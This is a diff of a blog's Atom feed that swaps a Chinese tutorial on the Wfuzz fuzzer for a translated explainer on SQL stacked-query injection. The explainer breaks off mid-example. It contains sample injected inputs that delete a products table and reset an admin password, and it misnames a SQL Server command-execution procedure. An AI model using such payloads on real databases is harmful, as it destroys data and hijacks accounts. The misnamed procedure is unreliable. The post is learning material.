@@ -1,423 +1,272 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-02T17:47:26+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">Wfuzz的其他模块</title><link href="http://localhost:4000/blog/wfuzz2/" rel="alternate" type="text/html" title="Wfuzz的其他模块" /><published>2020-04-02T17:08:36+08:00</published><updated>2020-04-02T17:08:36+08:00</updated><id>http://localhost:4000/blog/wfuzz2</id><content type="html" xml:base="http://localhost:4000/blog/wfuzz2/">&lt;ul id=&quot;markdown-toc&quot;&gt;
-  &lt;li&gt;&lt;a href=&quot;#迭代器iterators&quot; id=&quot;markdown-toc-迭代器iterators&quot;&gt;迭代器(iterators)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#脚本scripts&quot; id=&quot;markdown-toc-脚本scripts&quot;&gt;脚本(scripts)&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;#加密encoders&quot; id=&quot;markdown-toc-加密encoders&quot;&gt;加密(encoders)&lt;/a&gt;&lt;/li&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-08T10:39:54+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">sueisok</title><subtitle>Notes,Thoughts and Else</subtitle><author><name>true</name></author><entry><title type="html">SQL注入-堆叠注入</title><link href="http://localhost:4000/blog/sqli-stacked-queries/" rel="alternate" type="text/html" title="SQL注入-堆叠注入" /><published>2020-04-08T10:10:57+08:00</published><updated>2020-04-08T10:10:57+08:00</updated><id>http://localhost:4000/blog/sqli-stacked-queries</id><content type="html" xml:base="http://localhost:4000/blog/sqli-stacked-queries/">&lt;ul id=&quot;markdown-toc&quot;&gt;
+  &lt;li&gt;&lt;a href=&quot;#stacked-queries&quot; id=&quot;markdown-toc-stacked-queries&quot;&gt;Stacked Queries&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#principle&quot; id=&quot;markdown-toc-principle&quot;&gt;Principle&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#stacked-queries-limitations&quot; id=&quot;markdown-toc-stacked-queries-limitations&quot;&gt;Stacked Queries Limitations&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#altering-data&quot; id=&quot;markdown-toc-altering-data&quot;&gt;Altering Data&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#calling-stored-procedures&quot; id=&quot;markdown-toc-calling-stored-procedures&quot;&gt;Calling Stored Procedures&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#ein-beispiel&quot; id=&quot;markdown-toc-ein-beispiel&quot;&gt;Ein Beispiel&lt;/a&gt;    &lt;ul&gt;
+      &lt;li&gt;&lt;a href=&quot;#思路&quot; id=&quot;markdown-toc-思路&quot;&gt;思路&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;a href=&quot;#refer&quot; id=&quot;markdown-toc-refer&quot;&gt;Refer&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;🤺基础用法请看上一篇&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;堆叠注入&lt;/code&gt;🤒&lt;/p&gt;
 
-&lt;p&gt;🤺&lt;a href=&quot;https://wfuzz.readthedocs.io/en/latest/&quot;&gt;该项目的官网手册&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;堆查询注入&lt;/code&gt;🤒&lt;/p&gt;
 
-&lt;p&gt;🤺Kali Linux自带此工具&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;堆注入&lt;/code&gt;🤒&lt;/p&gt;
 
-&lt;p&gt;🤺上一篇写了简单介绍和&lt;code class=&quot;highlighter-rouge&quot;&gt;payloads&lt;/code&gt;模块的用法，这里介绍其他三个主要模块&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;scripts&lt;/code&gt;、&lt;code class=&quot;highlighter-rouge&quot;&gt;encoders&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;🤔害，其实就是多语句注入，用分号。&lt;/p&gt;
 
-&lt;h1 id=&quot;迭代器iterators&quot;&gt;迭代器(iterators)&lt;/h1&gt;
+&lt;p&gt;这篇文章先翻译一个不知道从哪看来的讲堆叠注入的文章，und复现强网杯2019的一个题目&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&quot;stacked-queries&quot;&gt;Stacked Queries&lt;/h1&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e iterators
+&lt;p&gt;先翻译一下&lt;a href=&quot;https://www.sqlinjection.net/stacked-queries/&quot;&gt;SQL注入网站中的一篇文章&lt;/a&gt;&lt;/p&gt;
 
-Available iterators:
+&lt;blockquote&gt;
+  &lt;p&gt;Execute multiple statements in the same query to extend the possibilities of SQL injections.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-  Name    | Summary                                                                       
------------------------------------------------------------------------------------------
-  chain   | Returns an iterator returns elements from the first iterable until it is  
-          | exhausted, then proceeds to the next iterable, until all of the iterables are 
-          | exhausted.                                                                   
-  product | Returns an iterator cartesian product of input iterables.                     
-  zip     | Returns an iterator that aggregates elements from each of the iterables. 
+&lt;p&gt;在一个查询中执行多个语句，以扩展SQL注入的可能性。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Stacked queries provide a lot of control to the attacker. By terminating the original query and adding a new one, it will be possible to modify data and call stored procedures. This technique is massively used in SQL injection attacks and understanding its principle is essential to a sound understanding of this security issue.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;堆叠注入为攻击者提供了很大的控制权。用结束原始的查询添加新语句的方式，就可能对数据进行改动，或者执行程序。很多SQL注入攻击都是使用这种方式，了解他的原理对正确了解这一安全问题很重要。&lt;/p&gt;
+
+&lt;h2 id=&quot;principle&quot;&gt;Principle&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;In SQL, a semicolon indicates that the end of a statement has been reached and what follows is a new one. This allows executing multiple statements in the same call to the database server. Contrary to UNION attacks which are limited to SELECT statements, stacked queries can be used to execute any SQL statement or procedure. A classic attack using this technique could look like the following.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;在SQL语句中，分号意味着一段语句的结束，后面是另一段新的语句，这就允许在一个请求中执行多个语句。与UNION查询攻击对SELECT的限制相反，堆叠注入可以执行任何的SQL语句和程序，一个经典的攻击利用如下。&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MALICIOUS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;恶意用户输入&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WITH&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MULTIPLE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;STATEMENTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;THE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;PARAMETER&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PRODUCTID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;WAS&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;NOT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SANITIZED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;productid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;DELETE&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;构成的恶意语句&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iterators&lt;/code&gt;自带三个迭代器，&lt;code class=&quot;highlighter-rouge&quot;&gt;-m xxx&lt;/code&gt;使用迭代器&lt;/p&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;THE PARAMETER PRODUCTID WAS NOT SANITIZED.&lt;/code&gt;的意思是&lt;code class=&quot;highlighter-rouge&quot;&gt;PRODUCTID&lt;/code&gt;参数未清除。&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;chain&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;When the query is executed, a product is returned by the first statement and all products are deleted by the second.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;需要两个字典，一个占位符FUZZ，&lt;code class=&quot;highlighter-rouge&quot;&gt;chain&lt;/code&gt;可以整合两个字典为一个，传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n+m&lt;/code&gt;条payloads&lt;/p&gt;
+&lt;p&gt;请求执行后，返回第一个语句查询的id为1的&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;，第二步删除表中所有内容。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m chain http://172.16.70.163/FUZZ
+&lt;h2 id=&quot;stacked-queries-limitations&quot;&gt;Stacked Queries Limitations&lt;/h2&gt;
 
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
+&lt;blockquote&gt;
+  &lt;p&gt;It is important to mention that query stacking does not work in every situation. Most of the time, this kind of attack is impossible because the API and/or database engine do not support this functionality. Insufficient rights could also explain why the attacker is unable to modify data or call some procedures.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-Target: http://172.16.70.163/FUZZ
-Total requests: 17
+&lt;p&gt;值得一提的是堆叠注入不是在所有情况下都可以用，不支持的API或数据库就不可以用，权限不足也可能使得不能修改数据或执行程序。&lt;/p&gt;
 
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                     
-===================================================================
+&lt;blockquote&gt;
+  &lt;p&gt;Below is a list of query stacking support by the principal API and DBMS.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-000000002:   404        828 L    1806 W   36851 Ch    &quot;1&quot;                                         
-000000003:   404        828 L    1806 W   36850 Ch    &quot;2&quot;                                         
-000000004:   404        828 L    1806 W   36849 Ch    &quot;3&quot;                                         
-000000005:   404        828 L    1806 W   36850 Ch    &quot;4&quot;                                         
-000000006:   404        828 L    1806 W   36850 Ch    &quot;5&quot;                                         
-000000007:   404        828 L    1806 W   36850 Ch    &quot;6&quot;                                         
-000000008:   404        828 L    1806 W   36850 Ch    &quot;7&quot;                                         
-000000001:   200        213 L    495 W    7870 Ch     &quot;0&quot;                                         
-000000009:   404        828 L    1806 W   36850 Ch    &quot;8&quot;                                         
-000000010:   404        828 L    1806 W   36850 Ch    &quot;9&quot;                                         
-000000013:   404        828 L    1806 W   36886 Ch    &quot;Milch&quot;                                     
-000000014:   404        828 L    1806 W   36886 Ch    &quot;Apfel&quot;                                     
-000000017:   404        828 L    1806 W   36895 Ch    &quot;Schule&quot;                                    
-000000011:   404        828 L    1806 W   36859 Ch    &quot;10&quot;                                        
-000000012:   404        828 L    1806 W   36877 Ch    &quot;Heft&quot;                                      
-000000015:   404        828 L    1806 W   36976 Ch    &quot;Schweinefleisch&quot;                           
-000000016:   404        828 L    1806 W   36895 Ch    &quot;Kamera&quot;                                    
+&lt;p&gt;以下是支持堆叠注入的API或数据库。&lt;/p&gt;
 
-Total time: 0.215062
-Processed Requests: 17
-Filtered Requests: 0
-Requests/sec.: 79.04683
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;pre&gt;&lt;code class=&quot;language-mysql&quot;&gt;STACKED QUERY SUPPORT.
 
-&lt;p&gt;&lt;strong&gt;product&lt;/strong&gt;&lt;/p&gt;
+MySQL/PHP - Not supported (supported by MySQL for other API).
 
-&lt;p&gt;需要两个字典，两个占位符FUZZ，&lt;code class=&quot;highlighter-rouge&quot;&gt;product&lt;/code&gt;可以排列组合两个字典，按顺序传入占位符，一共&lt;code class=&quot;highlighter-rouge&quot;&gt;n*m&lt;/code&gt;条payloads&lt;/p&gt;
+SQL Server/Any API - Supported.
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-3 -w Deutsch.txt -m product http://172.16.70.163/FUZZ=FUZ2Z
-
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
-
-Target: http://172.16.70.163/FUZZ=FUZ2Z
-Total requests: 16
-
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                     
-===================================================================
-
-000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
-000000002:   404        828 L    1807 W   36904 Ch    &quot;0 - Milch&quot;                                 
-000000003:   404        828 L    1807 W   36902 Ch    &quot;0 - Apfel&quot;                                 
-000000004:   404        828 L    1807 W   36993 Ch    &quot;0 - Schweinefleisch&quot;                       
-000000005:   404        828 L    1807 W   36894 Ch    &quot;1 - Heft&quot;                                  
-000000006:   404        828 L    1807 W   36903 Ch    &quot;1 - Milch&quot;                                 
-000000007:   404        828 L    1807 W   36903 Ch    &quot;1 - Apfel&quot;                                 
-000000008:   404        828 L    1807 W   36994 Ch    &quot;1 - Schweinefleisch&quot;                       
-000000009:   404        828 L    1807 W   36894 Ch    &quot;2 - Heft&quot;                                  
-000000010:   404        828 L    1807 W   36903 Ch    &quot;2 - Milch&quot;                                 
-000000011:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
-000000012:   404        828 L    1807 W   36993 Ch    &quot;2 - Schweinefleisch&quot;                       
-000000013:   404        828 L    1807 W   36894 Ch    &quot;3 - Heft&quot;                                  
-000000014:   404        828 L    1807 W   36904 Ch    &quot;3 - Milch&quot;                                 
-000000015:   404        828 L    1807 W   36903 Ch    &quot;3 - Apfel&quot;                                 
-000000016:   404        828 L    1807 W   36994 Ch    &quot;3 - Schweinefleisch&quot;                       
-
-Total time: 0.207002
-Processed Requests: 16
-Filtered Requests: 0
-Requests/sec.: 77.29370
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;zip&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;需要两个字典，两个个占位符FUZZ和FU2Z，&lt;code class=&quot;highlighter-rouge&quot;&gt;zip&lt;/code&gt;可以两个字典一一对应，按顺序传入两个占位符，如果两个字典行数不相等则取行数少的，所以一共&lt;code class=&quot;highlighter-rouge&quot;&gt;min(n,m)&lt;/code&gt;条payloads&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -z range,0-10 -w Deutsch.txt -m zip http://172.16.70.163/FUZZ=FUZ2Z
-
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
-
-Target: http://172.16.70.163/FUZZ=FUZ2Z
-Total requests: 6
-
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                     
-===================================================================
-
-000000001:   404        828 L    1807 W   36895 Ch    &quot;0 - Heft&quot;                                  
-000000003:   404        828 L    1807 W   36903 Ch    &quot;2 - Apfel&quot;                                 
-000000002:   404        828 L    1807 W   36904 Ch    &quot;1 - Milch&quot;                                 
-000000004:   404        828 L    1807 W   36993 Ch    &quot;3 - Schweinefleisch&quot;                       
-000000005:   404        828 L    1807 W   36912 Ch    &quot;4 - Kamera&quot;                                
-000000006:   404        828 L    1807 W   36911 Ch    &quot;5 - Schule&quot;                                
-
-Total time: 0.238128
-Processed Requests: 6
-Filtered Requests: 0
-Requests/sec.: 25.19648
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;其实就很像Burpsuite里面的Intruder模块，目前感觉还是Intruder好用&lt;/p&gt;
-
-&lt;h1 id=&quot;脚本scripts&quot;&gt;脚本(scripts)&lt;/h1&gt;
-
-&lt;p&gt;&lt;strong&gt;具体说明&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz -e scripts
-
-Available scripts:
-
-  Category                      | Name          | Summary                                              
--------------------------------------------------------------------------------------------------------
-  default, active, discovery    | cvs_extractor | Parses CVS/Entries file.                             
-  default, passive              | errors        | Looks for error messages                             
-  default, active, discovery    | wc_extractor  | Parses subversion's wc.db file.                      
-  active, discovery             | links         | Parses HTML looking for new content.                 
-  re-enqueue, active, discovery | backups       | Looks for known backup filenames.                    
-  default, passive              | listing       | Looks for directory listing vulnerabilities          
-  default, active, discovery    | svn_extractor | Parses .svn/entries file.                            
-  verbose, passive              | headers       | Looks for server headers                             
-  default, active, discovery    | sitemap       | Parses sitemap.xml file                              
-  verbose, passive              | cookies       | Looks for new cookies                                
-  verbose, passive              | title         | Parses HTML page title                               
-  tools                         | grep          | HTTP response grep                                   
-  default, active, discovery    | robots        | Parses robots.txt looking for new content.           
-  tools, active                 | screenshot    | Performs a screen capture using linux cutycapt tool
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;strong&gt;分类说明&lt;/strong&gt;&lt;/p&gt;
+Oracle/Any API - Not supported.
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;table&gt;
   &lt;thead&gt;
     &lt;tr&gt;
-      &lt;th&gt;参数&lt;/th&gt;
-      &lt;th&gt;说明&lt;/th&gt;
+      &lt;th&gt;API and DBMS&lt;/th&gt;
+      &lt;th&gt;SUPPORT&lt;/th&gt;
     &lt;/tr&gt;
   &lt;/thead&gt;
   &lt;tbody&gt;
     &lt;tr&gt;
-      &lt;td&gt;passive&lt;/td&gt;
-      &lt;td&gt;被动脚本分析现有请求和响应，而无需执行新请求&lt;/td&gt;
+      &lt;td&gt;MySQL/PHP&lt;/td&gt;
+      &lt;td&gt;不支持，支持MySQL和其他API&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;active&lt;/td&gt;
-      &lt;td&gt;主动脚本对应用程序执行新请求以探测其漏洞&lt;/td&gt;
+      &lt;td&gt;SQL Server/Any API&lt;/td&gt;
+      &lt;td&gt;支持&lt;/td&gt;
     &lt;/tr&gt;
     &lt;tr&gt;
-      &lt;td&gt;discovery&lt;/td&gt;
-      &lt;td&gt;通过自动将发现的内容排入wfuzz请求的资源池，来帮助抓取网站&lt;/td&gt;
+      &lt;td&gt;Oracle/Any API&lt;/td&gt;
+      &lt;td&gt;不支持&lt;/td&gt;
     &lt;/tr&gt;
   &lt;/tbody&gt;
 &lt;/table&gt;
 
-&lt;p&gt;&lt;strong&gt;使用Scripts&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Even though we mentioned earlier that stacked queries can add any SQL statement, this injection technique is frequently limited when it comes to adding SELECTs. Both statements will be executed but software code is usually designed to handle the results returned by only one query. Consequently, the injected SELECT query will often generate an error or its results will simply be ignored. For this reason it is recommended to use UNION attacks when trying to extract data.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;p&gt;可以先查看一下某个模块的信息&lt;/p&gt;
+&lt;p&gt;尽管我们前面说过堆叠注入可以添加任意的SQL语句，但是对于添加&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt;的语句时，这种注入方式经常受限。虽然两条语句都可以执行，但是程序通常只返回一个语句的查询数据，注入&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt;语句经常会出错或者结果被忽略，因此建议使用&lt;code class=&quot;highlighter-rouge&quot;&gt;UNION&lt;/code&gt;注入提取数据。&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script-help=backups
+&lt;blockquote&gt;
+  &lt;p&gt;One last thing needs to be mentionned: to inject a valid SQL segment, the attacker will need to know some basic information such as table names, column names, etc. For more information refer to the section dedicated to information gathering.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-Name: backups 0.1
-Categories: re-enqueue,active,discovery
-Summary: Looks for known backup filenames.
-Author: Xavi Mendez (@xmendez)
-Description:
-   Looks for known backup filenames.
-Parameters:
-   - ext (= .bak,.tgz,.zip,.tar.gz,~,.rar,.old,.-.swp): Extensions to look for.
+&lt;p&gt;最后需要提醒的是注入SQL时，攻击者需要知道一些基本的信息，比如数据表名、数据库列名之类的。更多的信息，参照信息收集的部分。&lt;/p&gt;
 
+&lt;h2 id=&quot;altering-data&quot;&gt;Altering Data&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;The example presented at the beginning of the article demonstrates how query stacking can be used to delete information from the database. Instead of destroying data, attackers usually try to steal it or grant themselves high privileges on the system. A frequent approach is to change the administrator’s password. The example below illustrates a classic data modification using SQL injection.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;文章前面的例子展示了堆叠注入可以删除数据库信息，比起这个，攻击者通常会尝试窃取数据，或者提升自己的系统权限。一个常规操作就是修改系统管理员的密码，下面的例子将演示一个经典的SQL注入修改操作。&lt;/p&gt;
+
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pwd'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;用户恶意输入&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;GENERATED&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;categoryid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;UPDATE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;members&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'pwd'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;构成的恶意语句&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;使用scripts&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&quot;calling-stored-procedures&quot;&gt;Calling Stored Procedures&lt;/h2&gt;
 
-&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;脚本模块，&lt;code class=&quot;highlighter-rouge&quot;&gt;backups.txt&lt;/code&gt;为字典&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;Calling a procedure can bring SQL injections attacks to a whole new level. Nowadays, many database management systems come with built in packages of functions and procedures to simplify development and provide new functionalities. Therefore, it becomes possible to communicate with network, control the operating system and do even more from a simple SQL statement.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# wfuzz --script=backups -w backups.txt http://172.16.70.163/FUZZ
+&lt;p&gt;执行程序可以把SQL注入攻击提高一个档次。如今很多数据库管理系统会将方法和过程打包，以简化开发，提供新功能，因此就可能与互联网交互，通过简单的SQL语句控制操作系统或者更深入。&lt;/p&gt;
 
-********************************************************
-* Wfuzz 2.4 - The Web Fuzzer                           *
-********************************************************
+&lt;blockquote&gt;
+  &lt;p&gt;As there is no convention between DBMS regarding to packages and procedures name, the attacker will have to identify which database system is used before trying to call a built-in procedure. From there, the principle is the same as examples presented earlier except that the injected query is a stored procedure call. Let see how it can be done with the use of xp_shellcmd; a SQL Server’s specific command which allows executing operating system calls.&lt;/p&gt;
+&lt;/blockquote&gt;
 
-Target: http://172.16.70.163/FUZZ
-Total requests: 7
+&lt;p&gt;由于数据库的包和过程名没有关联，因此在执行程序前攻击者必须确定被攻击数据库的种类。这个原理和之前提到的例子中的需要确定表名等信息一样，只不过查询语句是执行存储的程序。&lt;code class=&quot;highlighter-rouge&quot;&gt;xp_shellcmd&lt;/code&gt;是一个&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Server&lt;/code&gt;的特殊语句，可以执行操作系统程序，来看一下执行程序是怎么做到的。&lt;/p&gt;
 
-===================================================================
-ID           Response   Lines    Word     Chars       Payload                                            
-===================================================================
+&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;USER&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;INPUT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
